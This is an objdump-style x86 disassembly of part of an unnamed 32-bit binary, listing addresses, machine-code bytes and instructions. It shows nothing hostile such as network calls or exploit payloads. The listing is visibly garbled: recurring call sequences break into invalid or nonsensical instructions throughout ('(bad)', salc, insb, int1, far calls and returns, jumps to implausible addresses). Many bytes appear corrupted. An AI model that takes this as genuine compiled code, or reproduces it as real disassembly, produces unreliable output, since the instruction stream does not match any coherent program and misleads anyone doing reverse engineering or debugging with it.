  40434f:	d6                   	salc
  404350:	8b 0d c8 6a 40 00    	mov    0x406ac8,%ecx
  404356:	68 e4 f1 40 00       	push   $0x40f1e4
  40435b:	83 c1 40             	add    $0x40,%ecx
  40435e:	51                   	push   %ecx
  40435f:	ff d6                	call   *%esi
  404361:	49                   	dec    %ecx
  404362:	15 a3 f7 6e 00       	adc    $0x6ef7a3,%eax
  404367:	68 ac f1 40 7b       	push   $0x7b40f1ac
  40436c:	83 c2 40             	add    $0x40,%edx
  40436f:	52                   	push   %edx
  404370:	ff d6                	call   *%esi
  404372:	b7 a4                	mov    $0xa4,%bh
  404374:	c0 40 00 22          	rolb   $0x22,0x0(%eax)
  404378:	6c                   	insb   (%dx),%es:(%edi)
  404379:	f1                   	int1
  40437a:	40                   	inc    %eax
  40437b:	00 83 98 40 50 84    	add    %al,-0x7bafbf68(%ebx)
  404381:	d6                   	salc
  404382:	8b 0d c8 c0 40 00    	mov    0x40c0c8,%ecx
  404388:	68 20 f1 40 00       	push   $0x40f120
  40438d:	b1 c1                	mov    $0xc1,%cl
  40438f:	40                   	inc    %eax
  404390:	51                   	push   %ecx
  404391:	ff d6                	call   *%esi
  404393:	8b 15 c8 c0 40 00    	mov    0x40c0c8,%edx
  404399:	68 8b f0 de 00       	push   $0xdef08b
  40439e:	83 c2 40             	add    $0x40,%edx
  4043a1:	5c                   	pop    %esp
  4043a2:	ff d6                	call   *%esi
  4043a4:	a1 c8 c0 40 00       	mov    0x40c0c8,%eax
  4043a9:	83 10 65             	adcl   $0x65,(%eax)
  4043ac:	9a c0 40 68 94 f0 40 	lcall  $0x40f0,$0x946840c0
  4043b3:	00 50 7b             	add    %dl,0x7b(%eax)
  4043b6:	d6                   	salc
  4043b7:	8b 0d c8 c0 40 00    	mov    0x40c0c8,%ecx
  4043bd:	68 58 fe 26 00       	push   $0x26fe58
  4043c2:	83 c1 40             	add    $0x40,%ecx
  4043c5:	51                   	push   %ecx
  4043c6:	ff d6                	call   *%esi
  4043c8:	8b 21                	mov    (%ecx),%esp
  4043ca:	c8 c0 ea 00          	enter  $0xeac0,$0x0
  4043ce:	68 28 b5 40 97       	push   $0x9740b528
  4043d3:	6c                   	insb   (%dx),%es:(%edi)
  4043d4:	e9 40 52 ff 3e       	jmp    0x3f3f9619
  4043d9:	a1 c8 f9 40 bb       	mov    0xbb40f9c8,%eax
  4043de:	68 ec ef 40 00       	push   $0x40efec
  4043e3:	c2 c0 40             	ret    $0x40c0
  4043e6:	12 ff                	adc    %bh,%bh
  4043e8:	d6                   	salc
  4043e9:	8b 0d c8 c0 40 5f    	mov    0x5f40c0c8,%ecx
  4043ef:	30 1c 2a             	xor    %bl,(%edx,%ebp,1)
  4043f2:	40                   	inc    %eax
  4043f3:	00 83 c1 40 f0 ff    	add    %al,-0xfbf3f(%ebx)
  4043f9:	d6                   	salc
  4043fa:	8b 15 17 c0 40 4d    	mov    0x4d40c017,%edx
  404400:	38 84 45 40 00 97 c2 	cmp    %al,-0x3d68ffc0(%ebp,%eax,2)
  404407:	40                   	inc    %eax
  404408:	85 ff                	test   %edi,%edi
  40440a:	d6                   	salc
  40440b:	a1 c8 f1 40 00       	mov    0x40f1c8,%eax
  404410:	68 48 ef 40 00       	push   $0x40ef48
  404415:	83 c0 6c             	add    $0x6c,%eax
  404418:	50                   	push   %eax
  404419:	ff d6                	call   *%esi
  40441b:	68 10 ef 40 00       	push   $0x40ef10
  404420:	8b bb c8 c0 40 00    	mov    0x40c0c8(%ebx),%edi
  404426:	83 c1 40             	add    $0x40,%ecx
  404429:	51                   	push   %ecx
  40442a:	b4 d6                	mov    $0xd6,%ah
  40442c:	8b 15 04 c0 40 1e    	mov    0x1e40c004,%edx
  404432:	83 c4 40             	add    $0x40,%esp
  404435:	83 c2 40             	add    $0x40,%edx
  404438:	68 d0 ee 40 05       	push   $0x540eed0
  40443d:	52                   	push   %edx
  40443e:	ff d6                	call   *%esi
  404440:	a1 83 c0 40 00       	mov    0x40c083,%eax
  404445:	51                   	push   %ecx
  404446:	27                   	daa
  404447:	af                   	scas   %es:(%edi),%eax
  404448:	40                   	inc    %eax
  404449:	00 83 25 8e 50 ff    	add    %al,-0xaf71db(%ebx)
  40444f:	d6                   	salc
  404450:	f6 0d c8 c0 40 00 68 	testb  $0x68,0x40c0c8
  404457:	40                   	inc    %eax
  404458:	ee                   	out    %al,(%dx)
  404459:	de 00                	fiadds (%eax)
  40445b:	83 c1 40             	add    $0x40,%ecx
  40445e:	51                   	push   %ecx
  40445f:	ff d6                	call   *%esi
  404461:	6c                   	insb   (%dx),%es:(%edi)
  404462:	15 c8 c0 40 00       	adc    $0x40c0c8,%eax
  404467:	68 f0 ed 40 00       	push   $0x40edf0
  40446c:	7c c2                	jl     0x404430
  40446e:	40                   	inc    %eax
  40446f:	52                   	push   %edx
  404470:	ff 11                	call   *(%ecx)
  404472:	a1 c8 c0 40 00       	mov    0x40c0c8,%eax
  404477:	72 a8                	jb     0x404421
  404479:	ed                   	in     (%dx),%eax
  40447a:	40                   	inc    %eax
  40447b:	00 83 be 40 50 ff    	add    %al,-0xafbf42(%ebx)
  404481:	89 8b 0d c8 c3 68    	mov    %ecx,0x68c3c80d(%ebx)
  404487:	27                   	daa
  404488:	68 60 ed 3b 00       	push   $0x3bed60
  40448d:	83 c1 40             	add    $0x40,%ecx
  404490:	51                   	push   %ecx
  404491:	ff d6                	call   *%esi
  404493:	8b 15 c8 c0 01 00    	mov    0x1c0c8,%edx
  404499:	68 18 ed 40 00       	push   $0x40ed18
  40449e:	8f c2                	pop    %edx
  4044a0:	40                   	inc    %eax
  4044a1:	52                   	push   %edx
  4044a2:	ff cd                	dec    %ebp
  4044a4:	a1 c8 c0 88 13       	mov    0x1388c0c8,%eax
  4044a9:	68 60 9c 40 00       	push   $0x409c60
  4044ae:	83 63 40 87          	andl   $0xffffff87,0x40(%ebx)
  4044b2:	99                   	cltd
  4044b3:	d6                   	salc
  4044b4:	43                   	inc    %ebx
  4044b5:	0d c8 c0 40 00       	or     $0x40c0c8,%eax
  4044ba:	83 c4 40             	add    $0x40,%esp
  4044bd:	83 bb 40 c8 e0 ec 40 	cmpl   $0x40,-0x131f37c0(%ebx)
  4044c4:	ad                   	lods   %ds:(%esi),%eax
  4044c5:	95                   	xchg   %eax,%ebp
  4044c6:	4b                   	dec    %ebx
  4044c7:	d6                   	salc
  4044c8:	8b 15 c8 4b 40 00    	mov    0x404bc8,%edx
  4044ce:	9a ac ec 40 00 eb c2 	lcall  $0xc2eb,$0x40ecac
  4044d5:	8c 52 ff             	mov    %ss,-0x1(%edx)
  4044d8:	26 a1 c8 b5 40 12    	mov    %es:0x1240b5c8,%eax
  4044de:	68 7c ec 40 00       	push   $0x40ec7c
  4044e3:	83 c0 75             	add    $0x75,%eax
  4044e6:	51                   	push   %ecx
  4044e7:	ff 10                	call   *(%eax)
  4044e9:	8b 0d c8 8c 40 00    	mov    0x408cc8,%ecx
  4044ef:	c4 40 ec             	les    -0x14(%eax),%eax
  4044f2:	40                   	inc    %eax
  4044f3:	00 83 c1 40 51 fc    	add    %al,-0x3aebf3f(%ebx)
  4044f9:	d6                   	salc
  4044fa:	8b 52 c8             	mov    -0x38(%edx),%edx
  4044fd:	c0 40 00 68          	rolb   $0x68,0x0(%eax)
  404501:	f8                   	clc
  404502:	eb 69                	jmp    0x40456d
  404504:	00 83 c2 40 52 ff    	add    %al,-0xadbf3e(%ebx)
  40450a:	d6                   	salc
  40450b:	a1 41 c0 40 00       	mov    0x40c041,%eax
  404510:	68 cd eb 10 00       	push   $0x10ebcd
  404515:	83 c0 40             	add    $0x40,%eax
  404518:	50                   	push   %eax
  404519:	ff d6                	call   *%esi
  40451b:	8b 0d c8 c0 40 00    	mov    0x40c0c8,%ecx
  404521:	68 70 eb 40 00       	push   $0x40eb70
  404526:	83 c1 40             	add    $0x40,%ecx
  404529:	51                   	push   %ecx
  40452a:	ff 15 8b 05 c8 c0    	call   *0xc0c8058b
  404530:	40                   	inc    %eax
  404531:	00 68 4e             	add    %ch,0x4e(%eax)
  404534:	eb 40                	jmp    0x404576
  404536:	00 83 c2 40 b7 13    	add    %al,0x13b740c2(%ebx)
  40453c:	d6                   	salc
  40453d:	a1 0c c0 9d 00       	mov    0x9dc00c,%eax
  404542:	83 c4 40             	add    $0x40,%esp
  404545:	83 c0 40             	add    $0x40,%eax
  404548:	68 f4 ea 40 95       	push   $0x9540eaf4
  40454d:	50                   	push   %eax
  40454e:	4d                   	dec    %ebp
  40454f:	d6                   	salc
  404550:	83 c4 08             	add    $0x8,%esp
  404553:	6a 16                	push   $0x16
  404555:	ff 15 70 c1 f7 00    	call   *0xf7c170
  40455b:	9b                   	fwait
  40455c:	4c                   	dec    %esp
  40455d:	3c 90                	cmp    $0x90,%al
  40455f:	90                   	nop
  404560:	55                   	push   %ebp
  404561:	8b ec                	mov    %esp,%ebp
  404563:	51                   	push   %ecx
  404564:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404565:	4c                   	dec    %esp
  404566:	40                   	inc    %eax
  404567:	41                   	inc    %ecx
  404568:	00 53 8b             	add    %dl,-0x75(%ebx)
  40456b:	5d                   	pop    %ebp
  40456c:	58                   	pop    %eax
  40456d:	56                   	push   %esi
  40456e:	57                   	push   %edi
  40456f:	53                   	push   %ebx
  404570:	50                   	push   %eax
  404571:	e8 da 12 00 00       	call   0x405850
  404576:	a3 40 40 41 ee       	mov    %eax,0xee414040
  40457b:	8b fb                	mov    %ebx,%edi
  40457d:	8d                   	lea    (bad),%ecx
  40457e:	c9                   	leave
  40457f:	ff 33                	push   (%ebx)
  404581:	c0 f2 12             	shl    $0x12,%dl
  404584:	8b 35 34 c1 40 00    	mov    0x40c134,%esi
  40458a:	80 d1 49             	adc    $0x49,%cl
  40458d:	83 f9 07             	cmp    $0x7,%ecx
  404590:	0f 29 d7             	movaps %xmm2,%xmm7
  404593:	b4 00                	mov    $0x0,%ah
  404595:	00 6a 07             	add    %ch,0x7(%edx)
  404598:	14 d8                	adc    $0xd8,%al
  40459a:	f2 40                	repnz inc %eax
  40459c:	00 53 ff             	add    %dl,-0x1(%ebx)
  40459f:	d6                   	salc
  4045a0:	eb c4                	jmp    0x404566
  4045a2:	0c 85                	or     $0x85,%al
  4045a4:	c0 0f 54             	rorb   $0x54,(%edi)
  4045a7:	c2 e1 00             	ret    $0xe1
  4045aa:	00 83 c3 07 6a 2f    	add    %al,0x2f6a07c3(%ebx)
  4045b0:	53                   	push   %ebx
  4045b1:	40                   	inc    %eax
  4045b2:	15 7c 30 40 00       	adc    $0x40307c,%eax
  4045b7:	83 c4 08             	add    $0x8,%esp
  4045ba:	89 45 4d             	mov    %eax,0x4d(%ebp)
  4045bd:	85 c0                	test   %eax,%eax
  4045bf:	0f 84 0c 01 00 00    	je     0x4046d1
  4045c5:	8b 4b a1             	mov    -0x5f(%ebx),%ecx
  4045c8:	4c                   	dec    %esp
  4045c9:	40                   	inc    %eax
  4045ca:	41                   	inc    %ecx
  4045cb:	00 da                	add    %bl,%dl
  4045cd:	41                   	inc    %ecx
  4045ce:	8d 56 cd             	lea    -0x33(%esi),%edx
  4045d1:	52                   	push   %edx
  4045d2:	50                   	push   %eax
  4045d3:	e8 ac 04 00 58       	call   0x58404a84
  4045d8:	8b ce                	mov    %esi,%ecx
  4045da:	8b f3                	mov    %ebx,%esi
  4045dc:	ad                   	lods   %ds:(%esi),%eax
  4045dd:	d1 8b f8 c1 14 02    	rorl   $1,0x214c1f8(%ebx)
  4045e3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4045e5:	e2 ed                	loop   0x4045d4
  4045e7:	83 e1 03             	and    $0x3,%ecx
  4045ea:	40                   	inc    %eax
  4045eb:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4045ec:	8b 75 08             	mov    0x8(%ebp),%esi
  4045ef:	8b 21                	mov    (%ecx),%esp
  4045f1:	2b cb                	sub    %ebx,%ecx
  4045f3:	fe 04 ca             	incb   (%edx,%ecx,8)
  4045f6:	00 8b 3e 4c 40 0b    	add    %cl,0xb404c3e(%ebx)
  4045fc:	00 98 50 8d 45 fc    	add    %bl,-0x3ba72b0(%eax)
  404602:	05 ff 17 41 00       	add    $0x4117ff,%eax
  404607:	50                   	push   %eax
  404608:	68 89 dc 9f 00       	push   $0x9fdc89
  40460d:	e8 27 28 d4 00       	call   0x1146e39
  404612:	85 c0                	test   %eax,%eax
  404614:	0f 85 fd f3 00 00    	jne    0x413a17
  40461a:	a1 00 18 3d 2f       	mov    0x2f3d1800,%eax
  40461f:	85 c0                	test   %eax,%eax
  404621:	0f 84 f0 00 00 00    	je     0x404717
  404627:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40462a:	85 fc                	test   %edi,%esp
  40462c:	0f 9d e5             	setge  %ch
  40462f:	00 00                	add    %al,(%eax)
  404631:	94                   	xchg   %eax,%esp
  404632:	aa                   	stos   %al,%es:(%edi)
  404633:	0d 8a 40 41 00       	or     $0x41408a,%eax
  404638:	56                   	push   %esi
  404639:	cf                   	iret
  40463a:	e8 11 12 00 00       	call   0x405850
  40463f:	1d e4 17 41 00       	sbb    $0x4117e4,%eax
  404644:	c6 06 00             	movb   $0x0,(%esi)
  404647:	50                   	push   %eax
  404648:	d0 5b 75             	rcrb   $1,0x75(%ebx)
  40464b:	6b 8b e1 24 18 41 00 	imul   $0x0,0x411824e1(%ebx),%ecx
  404652:	a1 4c 40 41 00       	mov    0x41404c,%eax
  404657:	52                   	push   %edx
  404658:	68 c7 f2 40 d6       	push   $0xd640f2c7
  40465d:	50                   	push   %eax
  40465e:	e8 6d 0f 00 00       	call   0x4055d0
  404663:	83 c4 0c             	add    $0xc,%esp
  404666:	ca 9c 0b             	lret   $0xb9c
  404669:	41                   	inc    %ecx
  40466a:	00 9d 72 8b 6c 83    	add    %bl,-0x7c93748e(%ebp)
  404670:	c9                   	leave
  404671:	ff 33                	push   (%ebx)
  404673:	19 f2                	sbb    %esi,%edx
  404675:	ae                   	scas   %es:(%edi),%al
  404676:	f7 d1                	not    %ecx
  404678:	94                   	xchg   %eax,%esp
  404679:	83 b1 08 0f 86 77 ff 	xorl   $0xffffffff,0x77860f08(%ecx)
  404680:	ff 84 6a 64 ad c4 f2 	incl   -0xd3b529c(%edx,%ebp,2)
  404687:	40                   	inc    %eax
  404688:	00 eb                	add    %ch,%bl
  40468a:	ff d6                	call   *%esi
  40468c:	83 c4 4d             	add    $0x4d,%esp
  40468f:	85 c0                	test   %eax,%eax
  404691:	0f d1 17             	psrlw  (%edi),%mm2
  404694:	ff                   	(bad)
  404695:	ff                   	(bad)
  404696:	ff b4 0d c8 c0 40 00 	push   0x40c0c8(%ebp,%ecx,1)
  40469d:	68 9c f2 40 00       	push   $0x40f29c
  4046a2:	83 c1 40             	add    $0x40,%ecx
  4046a5:	51                   	push   %ecx
  4046a6:	ff 15 80 c1 40 00    	call   *0x40c180
  4046ac:	85 c4                	test   %eax,%esp
  4046ae:	08 7c 01 ff          	or     %bh,-0x1(%ecx,%eax,1)
  4046b2:	ed                   	in     (%dx),%eax
  4046b3:	70 c1                	jo     0x404676
  4046b5:	40                   	inc    %eax
  4046b6:	99                   	cltd
  4046b7:	8b c6                	mov    %esi,%eax
  4046b9:	00 18                	add    %bl,(%eax)
  4046bb:	41                   	inc    %ecx
  4046bc:	36 89 0d e1 0b 41 00 	mov    %ecx,%ss:0x410be1
  4046c3:	66 93                	xchg   %ax,%bx
  4046c5:	f4                   	hlt
  4046c6:	17                   	pop    %ss
  4046c7:	41                   	inc    %ecx
  4046c8:	00 66 85             	add    %ah,-0x7b(%esi)
  4046cb:	a2 75 1b 66 51       	mov    %al,0x51661b75
  4046d0:	05 f4 17 41 00       	add    $0x4117f4,%eax
  4046d5:	d7                   	xlat   %ds:(%ebx)
  4046d6:	f0 5f                	lock pop %edi
  4046d8:	e6 c7                	out    %al,$0xc7
  4046da:	26 ac                	lods   %es:(%esi),%al
  4046dc:	0b 41 00             	or     0x0(%ecx),%eax
  4046df:	b0 02                	mov    $0x2,%al
  4046e1:	12 00                	adc    (%eax),%al
  4046e3:	33 c0                	xor    %eax,%eax
  4046e5:	5b                   	pop    %ebx
  4046e6:	8b 6f f6             	mov    -0xa(%edi),%ebp
  4046e9:	c3                   	ret
  4046ea:	66 3d 50 8e          	cmp    $0x8e50,%ax
  4046ee:	f6 e7                	mul    %bh
  4046f0:	3b d2                	cmp    %edx,%edx
  4046f2:	09 8b 13 a1 4c 40    	or     %ecx,0x404ca113(%ebx)
  4046f8:	41                   	inc    %ecx
  4046f9:	00 52 68             	add    %dl,0x68(%edx)
  4046fc:	98                   	cwtl
  4046fd:	05 4f 00 50 e8       	add    $0xe850004f,%eax
  404702:	2b 0e                	sub    (%esi),%ecx
  404704:	00 00                	add    %al,(%eax)
  404706:	83 c4 0c             	add    $0xc,%esp
  404709:	a3 ac 0b 41 00       	mov    %eax,0x410bac
  40470e:	33 c0                	xor    %eax,%eax
  404710:	5f                   	pop    %edi
  404711:	5e                   	pop    %esi
  404712:	5b                   	pop    %ebx
  404713:	8b e5                	mov    %ebp,%esp
  404715:	5d                   	pop    %ebp
  404716:	db 5f e1             	fistpl -0x1f(%edi)
  404719:	ba 01 00 00 00       	mov    $0x1,%edx
  40471e:	5b                   	pop    %ebx
  40471f:	8b e5                	mov    %ebp,%esp
  404721:	5d                   	pop    %ebp
  404722:	c3                   	ret
  404723:	90                   	nop
  404724:	90                   	nop
  404725:	90                   	nop
  404726:	90                   	nop
  404727:	90                   	nop
  404728:	90                   	nop
  404729:	90                   	nop
  40472a:	90                   	nop
  40472b:	90                   	nop
  40472c:	90                   	nop
  40472d:	90                   	nop
  40472e:	90                   	nop
  40472f:	29 55 8b             	sub    %edx,-0x75(%ebp)
  404732:	a3 81 ec d8 00       	mov    %eax,0xd8ec81
  404737:	00 00                	add    %al,(%eax)
  404739:	a1 ad 40 41 00       	mov    0x4140ad,%eax
  40473e:	c7                   	(bad)
  40473f:	57                   	push   %edi
  404740:	5d                   	pop    %ebp
  404741:	7d 08                	jge    0x40474b
  404743:	50                   	push   %eax
  404744:	68 ff 0f 00 00       	push   $0xfff
  404749:	6a d0                	push   $0xffffffd0
  40474b:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40474e:	57                   	push   %edi
  40474f:	51                   	push   %ecx
  404750:	0a ab 4c 00 6b 8b    	or     -0x7494ffb4(%ebx),%ch
  404756:	f0 85 f6             	lock test %esi,%esi
  404759:	f2 2d 8d 55 e7 6a    	repnz sub $0x6ae7558d,%eax
  40475f:	ef                   	out    %eax,(%dx)
  404760:	52                   	push   %edx
  404761:	56                   	push   %esi
  404762:	dd 79 3f             	fnstsw 0x3f(%ecx)
  404765:	00 00                	add    %al,(%eax)
  404767:	50                   	push   %eax
  404768:	a1 c8 c0 0a 00       	mov    0xac0c8,%eax
  40476d:	57                   	push   %edi
  40476e:	83 c0 c4             	add    $0xffffffc4,%eax
  404771:	68 60 f3 40 00       	push   $0x40f360
  404776:	0e                   	push   %cs
  404777:	ff 0b                	decl   (%ebx)
  404779:	80 c1 40             	add    $0x40,%cl
  40477c:	00 e2                	add    %ah,%dl
  40477e:	c4 10                	les    (%eax),%edx
  404780:	8b ad 48 5e 8b e5    	mov    -0x1a74a1b8(%ebp),%ebp
  404786:	8b c3                	mov    %ebx,%eax
  404788:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40478b:	8d 95 28 ff ff ff    	lea    -0xd8(%ebp),%edx
  404791:	24 ce                	and    $0xce,%al
  404793:	70 d9                	jo     0x40476e
  404795:	73 00                	jae    0x404797
  404797:	52                   	push   %edx
  404798:	e8 43 59 00 1d       	call   0x1d40a0e0
  40479d:	e9 f0 91 f6 74       	jmp    0x7536d992
  4047a2:	c0 24 45 88 6a 76 50 	shlb   $0x56,0x50766a88(,%eax,2)
  4047a9:	56 
  4047aa:	83 1b 3f             	sbbl   $0x3f,(%ebx)
  4047ad:	63 00                	arpl   %eax,(%eax)
  4047af:	8b 0d c8 c0 40 00    	mov    0x40c0c8,%ecx
  4047b5:	50                   	push   %eax
  4047b6:	05 83 c1 40 68       	add    $0x6840c183,%eax
  4047bb:	34 f3                	xor    $0xf3,%al
  4047bd:	40                   	inc    %eax
  4047be:	ce                   	into
  4047bf:	51                   	push   %ecx
  4047c0:	ff 15 80 c1 40 00    	call   *0x40c180
  4047c6:	83 7c 10 8b 44       	cmpl   $0x44,-0x75(%eax,%edx,1)
  4047cb:	5f                   	pop    %edi
  4047cc:	5e                   	pop    %esi
  4047cd:	8b fa                	mov    %edx,%edi
  4047cf:	5d                   	pop    %ebp
  4047d0:	c3                   	ret
  4047d1:	8b 85 50 ff ff ff    	mov    -0xb0(%ebp),%eax
  4047d7:	50                   	push   %eax
  4047d8:	a3 70 e8 41 00       	mov    %eax,0x41e870
  4047dd:	ff 15 5c c1 40 00    	call   *0x40c15c
  4047e3:	83 c4 04             	add    $0x4,%esp
  4047e6:	a3 e1 38 41 00       	mov    %eax,0x4138e1
  4047eb:	85 c0                	test   %eax,%eax
  4047ed:	75 23                	jne    0x404812
  4047ef:	8b 15 c8 17 40 00    	mov    0x4017c8,%edx
  4047f5:	69 08 f3 40 00 83    	imul   $0x830040f3,(%eax),%ecx
  4047fb:	c2 40 52             	ret    $0x5240
  4047fe:	be 15 80 9e 40       	mov    $0x409e8015,%esi
  404803:	8e 83 c4 02 b8 0c    	mov    0xcb802c4(%ebx),%es
  404809:	00 00                	add    %al,(%eax)
  40480b:	00 5f 5e             	add    %bl,0x5e(%edi)
  40480e:	22 7e 5d             	and    0x5d(%esi),%bh
  404811:	c3                   	ret
  404812:	fe 0d 70 02 41 00    	decb   0x410270
  404818:	8b 55 08             	mov    0x8(%ebp),%edx
  40481b:	6a 1a                	push   $0x1a
  40481d:	2e 50                	cs push %eax
  40481f:	52                   	push   %edx
  404820:	e8 3b 50 00 00       	call   0x409860
  404825:	8b 71 85             	mov    -0x7b(%ecx),%esi
  404828:	f6 74 2d 8d          	divb   -0x73(%ebp,%ebp,1)
  40482c:	45                   	inc    %ebp
  40482d:	88 55 db             	mov    %dl,-0x25(%ebp)
  404830:	50                   	push   %eax
  404831:	56                   	push   %esi
  404832:	e8 a9 ad 00 00       	call   0x40f5e0
  404837:	8b 0d c8 c0 40 41    	mov    0x4140c0c8,%ecx
  40483d:	50                   	push   %eax
  40483e:	83 c1 40             	add    $0x40,%ecx
  404841:	ba e0 f2 40 00       	mov    $0x40f2e0,%edx
  404846:	51                   	push   %ecx
  404847:	ff 15 80 c1 ba 6a    	call   *0x6abac180
  40484d:	83 c4 0c             	add    $0xc,%esp
  404850:	8b c6                	mov    %esi,%eax
  404852:	5f                   	pop    %edi
  404853:	5e                   	pop    %esi
  404854:	8b e5                	mov    %ebp,%esp
  404856:	5d                   	pop    %ebp
  404857:	97                   	xchg   %eax,%edi
  404858:	8b 55 08             	mov    0x8(%ebp),%edx
  40485b:	33 e8                	xor    %eax,%ebp
  40485d:	bf 4f 00 00 5f       	mov    $0x5f00004f,%edi
  404862:	c8 c0 5e 8b          	enter  $0x5ec0,$0x8b
  404866:	e5 5d                	in     $0x5d,%eax
  404868:	c3                   	ret
  404869:	90                   	nop
  40486a:	90                   	nop
  40486b:	90                   	nop
  40486c:	a3 06 90 9d 55       	mov    %eax,0x559d9006
  404871:	8b ec                	mov    %esp,%ebp
  404873:	56                   	push   %esi
  404874:	93                   	xchg   %eax,%ebx
  404875:	75 08                	jne    0x40487f
  404877:	6a 68                	push   $0x68
  404879:	c7                   	(bad)
  40487a:	ca 00 00             	lret   $0x0
  40487d:	00 0e                	add    %cl,(%esi)
  40487f:	ff 15 5c c1 40 00    	call   *0x40c15c
  404885:	8b d0                	mov    %eax,%edx
  404887:	83 c4 04             	add    $0x4,%esp
  40488a:	85 d2                	test   %edx,%edx
  40488c:	75 0a                	jne    0x404898
  40488e:	fa                   	cli
  40488f:	0c 00                	or     $0x0,%al
  404891:	00 00                	add    %al,(%eax)
  404893:	5e                   	pop    %esi
  404894:	e2 c2                	loop   0x404858
  404896:	f8                   	clc
  404897:	00 57 b9             	add    %dl,-0x47(%edi)
  40489a:	1a 00                	sbb    (%eax),%al
  40489c:	28 00                	sub    %al,(%eax)
  40489e:	33 c0                	xor    %eax,%eax
  4048a0:	8b fa                	mov    %edx,%edi
  4048a2:	f3 ab                	rep stos %eax,%es:(%edi)
  4048a4:	89 42 04             	mov    %eax,0x4(%edx)
  4048a7:	89 16                	mov    %edx,(%esi)
  4048a9:	53                   	push   %ebx
  4048aa:	5e                   	pop    %esi
  4048ab:	5d                   	pop    %ebp
  4048ac:	c2 04 ca             	ret    $0xca04
  4048af:	02 55 8b             	add    -0x75(%ebp),%dl
  4048b2:	ec                   	in     (%dx),%al
  4048b3:	8b 24 08             	mov    (%eax,%ecx,1),%esp
  4048b6:	08 e7                	or     %ah,%bh
  4048b8:	57                   	push   %edi
  4048b9:	8b 3d 30 c1 40 0d    	mov    0xd40c130,%edi
  4048bf:	8d 70 14             	lea    0x14(%eax),%esi
  4048c2:	bb 14 00 00 00       	mov    $0x14,%ebx
  4048c7:	8b 06                	mov    (%esi),%eax
  4048c9:	85 c0                	test   %eax,%eax
  4048cb:	74 10                	je     0x4048dd
  4048cd:	8b 08                	mov    (%eax),%ecx
  4048cf:	50                   	push   %eax
  4048d0:	89 0e                	mov    %ecx,(%esi)
  4048d2:	ff d7                	call   *%edi
  4048d4:	8b 06                	mov    (%esi),%eax
  4048d6:	83 c4 04             	add    $0x4,%esp
  4048d9:	85 c0                	test   %eax,%eax
  4048db:	17                   	pop    %ss
  4048dc:	48                   	dec    %eax
  4048dd:	83 c6 04             	add    $0x4,%esi
  4048e0:	4b                   	dec    %ebx
  4048e1:	c5 01                	lds    (%ecx),%eax
  4048e3:	8b 47 71             	mov    0x71(%edi),%eax
  4048e6:	52                   	push   %edx
  4048e7:	ff d7                	call   *%edi
  4048e9:	83 c4 04             	add    $0x4,%esp
  4048ec:	5f                   	pop    %edi
  4048ed:	ee                   	out    %al,(%dx)
  4048ee:	5b                   	pop    %ebx
  4048ef:	5d                   	pop    %ebp
  4048f0:	c2 04 00             	ret    $0x4
  4048f3:	a9 90 90 90 90       	test   $0x90909090,%eax
  4048f8:	90                   	nop
  4048f9:	ce                   	into
  4048fa:	47                   	inc    %edi
  4048fb:	90                   	nop
  4048fc:	92                   	xchg   %eax,%edx
  4048fd:	d5 90                	aad    $0x90
  4048ff:	90                   	nop
  404900:	55                   	push   %ebp
  404901:	8b ec                	mov    %esp,%ebp
  404903:	91                   	xchg   %eax,%ecx
  404904:	4d                   	dec    %ebp
  404905:	08 8b c5 0c 89 41    	or     %cl,0x41890cc5(%ebx)
  40490b:	0c 0e                	or     $0xe,%al
  40490d:	c2 08 00             	ret    $0x8
  404910:	55                   	push   %ebp
  404911:	8b ec                	mov    %esp,%ebp
  404913:	8b 45 08             	mov    0x8(%ebp),%eax
  404916:	b5 40                	mov    $0x40,%ch
  404918:	0c 5d                	or     $0x5d,%al
  40491a:	d3 04 d6             	roll   %cl,(%esi,%edx,8)
  40491d:	90                   	nop
  40491e:	90                   	nop
  40491f:	af                   	scas   %es:(%edi),%eax
  404920:	55                   	push   %ebp
  404921:	8b a7 8b 59 08 8b    	mov    -0x74f7a675(%edi),%esp
  404927:	45                   	inc    %ebp
  404928:	0c 89                	or     $0x89,%al
  40492a:	2c 10                	sub    $0x10,%al
  40492c:	5d                   	pop    %ebp
  40492d:	c2 08 00             	ret    $0x8
  404930:	55                   	push   %ebp
  404931:	8b ec                	mov    %esp,%ebp
  404933:	8b 45 08             	mov    0x8(%ebp),%eax
  404936:	8b 40 10             	mov    0x10(%eax),%eax
  404939:	5d                   	pop    %ebp
  40493a:	1c 04                	sbb    $0x4,%al
  40493c:	00 90 90 90 d5 76    	add    %dl,0x76d59090(%eax)
  404942:	ec                   	in     (%dx),%al
  404943:	44                   	inc    %esp
  404944:	a0 d8 02 ad 7a       	mov    0x7aad02d8,%al
  404949:	56                   	push   %esi
  40494a:	8a c8                	mov    %al,%cl
  40494c:	fe c0                	inc    %al
  40494e:	84 ff                	test   %bh,%bh
  404950:	a2 d8 41 8d 00       	mov    %al,0x8d41d8
  404955:	b0 85                	mov    $0x85,%al
  404957:	b0 00                	mov    $0x0,%al
  404959:	00 00                	add    %al,(%eax)
  40495b:	68 1b 02 41 00       	push   $0x41021b
  404960:	e8 0b ff ff 2e       	call   0x2f404870
  404965:	85 49 74             	test   %ecx,0x74(%ecx)
  404968:	0c c6                	or     $0xc6,%al
  40496a:	05 f3 02 41 00       	add    $0x4102f3,%eax
  40496f:	00 5e 8b             	add    %bl,-0x75(%esi)
  404972:	e5 5d                	in     $0x5d,%eax
  404974:	c3                   	ret
  404975:	8b cf                	mov    %edi,%ecx
  404977:	75 1f                	jne    0x404998
  404979:	3b 00                	cmp    (%eax),%eax
  40497b:	52                   	push   %edx
  40497c:	71 00                	jno    0x40497e
  40497e:	53                   	push   %ebx
  40497f:	00 68 dc             	add    %ch,-0x24(%eax)
  404982:	1f                   	pop    %ds
  404983:	41                   	inc    %ecx
  404984:	00 e8                	add    %ch,%al
  404986:	d6                   	salc
  404987:	05 21 00 8b f0       	add    $0xf08b0021,%eax
  40498c:	85 f6                	test   %esi,%esi
  40498e:	74 23                	je     0x4049b3
  404990:	a1 e0 02 41 00       	mov    0x4102e0,%eax
  404995:	50                   	push   %eax
  404996:	e8 15 e0 ff 7d       	call   0x7e4029b0
  40499b:	8b c6                	mov    %esi,%eax
  40499d:	9f                   	lahf
  40499e:	05 e0 02 41 00       	add    $0x4102e0,%eax
  4049a3:	00 00                	add    %al,(%eax)
